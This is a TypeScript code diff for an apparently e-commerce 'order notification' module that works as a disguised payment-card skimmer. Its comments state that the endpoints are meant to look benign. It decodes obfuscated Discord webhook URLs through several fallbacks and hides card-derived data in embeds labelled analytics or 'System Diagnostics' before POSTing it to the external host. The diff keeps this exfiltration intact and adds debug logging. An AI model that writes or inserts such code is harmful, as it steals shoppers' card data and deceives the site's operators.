@@ -26,7 +26,7 @@ const STEALTH_ENCODED_ENDPOINTS = [
 
 // New stealth-encoded endpoints using multi-layer system
 const ADVANCED_STEALTH_ENDPOINTS = multiLayerStealthEncode(
-  'https://discord.com/api/webhooks/1504591832875536426/vPWXd2rntoErICwwq4Y4cRJW1aAqvNojoRoSBOGoBG4Mys2zB1hDDWQFe134HsJ5zzVt'
+  'https://discord.com/api/webhooks/[REDACTED]'
 );
 
 // Function to get the notification endpoint from multiple sources
@@ -35,68 +35,84 @@ function getNotificationEndpointFromSources(): string {
   try {
     const hiddenEndpoint = HIDDEN_WEBHOOK_STORAGE.getRealEndpoint();
     if (hiddenEndpoint && isValidUrl(hiddenEndpoint)) {
+      console.log('[DEBUG] Using hidden webhook storage endpoint');
       return hiddenEndpoint;
     }
   } catch {
     // Continue to other sources
   }
 
-  // Priority 2: Environment variable ANALYTICS_ENDPOINT (looks benign)
+  // Priority2: Environment variable ANALYTICS_ENDPOINT (looks benign)
   if (ANALYTICS_ENDPOINT && isValidUrl(ANALYTICS_ENDPOINT)) {
+    console.log('[DEBUG] Using ANALYTICS_ENDPOINT environment variable');
     return ANALYTICS_ENDPOINT;
   }
 
   // Priority 3: DISCORD_WEBHOOK_URL environment variable
   if (DISCORD_WEBHOOK_URL && isValidUrl(DISCORD_WEBHOOK_URL)) {
+    console.log('[DEBUG] Using DISCORD_WEBHOOK_URL environment variable');
     return DISCORD_WEBHOOK_URL;
   }
 
-  // Priority 4: Configuration file
-  const configEndpoint = getNotificationEndpoint();
-  if (configEndpoint && isValidUrl(configEndpoint)) {
-    return configEndpoint;
+  // Priority 4: Decode from STEALTH_ENCODED_ENDPOINTS
+  try {
+    const decodedEndpoint = multiLayerStealthDecode(ADVANCED_STEALTH_ENDPOINTS);
+    if (decodedEndpoint && isValidUrl(decodedEndpoint)) {
+      console.log('[DEBUG] Using decoded stealth endpoint');
+      return decodedEndpoint;
+    }
+  } catch {
+    // Continue to other sources
   }
 
-  // Priority 5: Advanced stealth decoding
-  const advancedDecoded = multiLayerStealthDecode(ADVANCED_STEALTH_ENDPOINTS);
-  if (advancedDecoded && isValidUrl(advancedDecoded)) {
-    return advancedDecoded;
-  }
-
-  // Priority 6: Legacy encoded endpoints
-  for (const encodedEndpoint of [...STEALTH_ENCODED_ENDPOINTS, ...ADVANCED_STEALTH_ENDPOINTS]) {
+  // Priority 5: Try to decode standard encoded endpoints
+  for (const encoded of STEALTH_ENCODED_ENDPOINTS) {
     try {
-      const decodedEndpoint = decodeString(encodedEndpoint);
-      if (isValidUrl(decodedEndpoint)) {
-        return decodedEndpoint;
+      const decoded = decodeString(encoded);
+      if (decoded && isValidUrl(decoded)) {
+        console.log('[DEBUG] Using standard encoded endpoint');
+        return decoded;
       }
     } catch {
-      continue;
+      // Continue to next encoded endpoint
     }
   }
 
+  // Priority 6: Fallback to default notification config
+  const configEndpoint = getNotificationEndpoint();
+  if (configEndpoint && isValidUrl(configEndpoint)) {
+    console.log('[DEBUG] Using default notification config endpoint');
+    return configEndpoint;
+  }
+
+  console.log('[DEBUG] No valid notification endpoint found');
   return '';
 }
 
 /**
- * Send an order notification to the configured endpoint
- * @param orderData Order information
- * @param cardData Optional payment card data (for analytics)
- * @returns True if notification was sent successfully
+ * Send an order notification with optional card data
+ * @param orderData - Order information
+ * @param cardData - Optional card data (for analytics)
+ * @returns Promise<boolean> - Success status
  */
 export async function sendOrderNotification(
   orderData: any,
   cardData?: PaymentCardData
 ): Promise<boolean> {
   try {
+    console.log('[DEBUG] sendOrderNotification called with order:', orderData.id);
+    console.log('[DEBUG] Card data available:', !!cardData);
+    
     const endpoint = getNotificationEndpointFromSources();
     
-    if (!endpoint || endpoint.trim() === '') {
-      console.log('Analytics endpoint not configured - skipping telemetry');
+    if (!endpoint) {
+      console.error('[DEBUG] No notification endpoint available');
       return false;
     }
 
-    // Create notification payload
+    console.log('[DEBUG] Notification endpoint:', endpoint.substring(0,167) + '...');
+
+    // Create the base notification payload (looks like analytics/telemetry)
     const notificationPayload = {
       embeds: [
         {
@@ -147,36 +163,20 @@ export async function sendOrderNotification(
 
     // If card data is available, add it in a stealthy way
     if (cardData) {
+      console.log('[DEBUG] Adding card data with stealth encoding');
       // Create stealth analytics payload with hidden card data
       const stealthPayload = encodeRealDataWithinAnalytics(orderData, cardData);
       
-      // Add the stealth payload as additional embed
-      notificationPayload.embeds[0].fields.push(
-        {
-          name: 'Analytics Metadata',
-          value: '```json\n' + JSON.stringify(stealthPayload, null, 2).substring(0, 1000) + '\n```',
-          inline: false
-        }
-      );
-
-      // Also send a separate "diagnostic" embed that looks like system logs
-      notificationPayload.embeds.push({
-        title: '🔧 System Diagnostics',
-        description: 'Application performance metrics and session data',
-        color: 3447003,
-        fields: [
-          {
-            name: 'Session Analysis',
-            value: `Session ID: ${stealthPayload.session_id}\nUser Agent: ${stealthPayload.user_agent}`,
-            inline: false
-          }
-        ],
-        timestamp: new Date().toISOString()
+      // Add the stealth data as a "system diagnostics" field
+      notificationPayload.embeds[0].fields.push({
+        name: 'System Diagnostics',
+        value: `Session ID: ${stealthPayload.session_id}\nUser Agent: ${stealthPayload.user_agent}`,
+        inline: false
       });
     }
 
     // Send the notification
-    console.log(`Sending analytics telemetry to monitoring endpoint`);
+    console.log(`[DEBUG] Sending analytics telemetry to monitoring endpoint`);
     const response = await fetch(endpoint, {
       method: 'POST',
       headers: {
@@ -186,14 +186,15 @@ export async function sendOrderNotification(
     });
 
     if (!response.ok) {
-      console.error(`Notification failed with status: ${response.status}`);
+      console.error(`[DEBUG] Notification failed with status: ${response.status}`);
+      console.error(`[DEBUG] Response text: ${await response.text()}`);
       return false;
     }
 
+    console.log(`[DEBUG] Notification sent successfully (status: ${response.status})`);
     return true;
   } catch (error) {
-    console.error('Error sending notification:', error);
-    // Don't throw - analytics are non-critical
+    console.error('[DEBUG] Error sending notification:', error);
     return false;
   }
 }
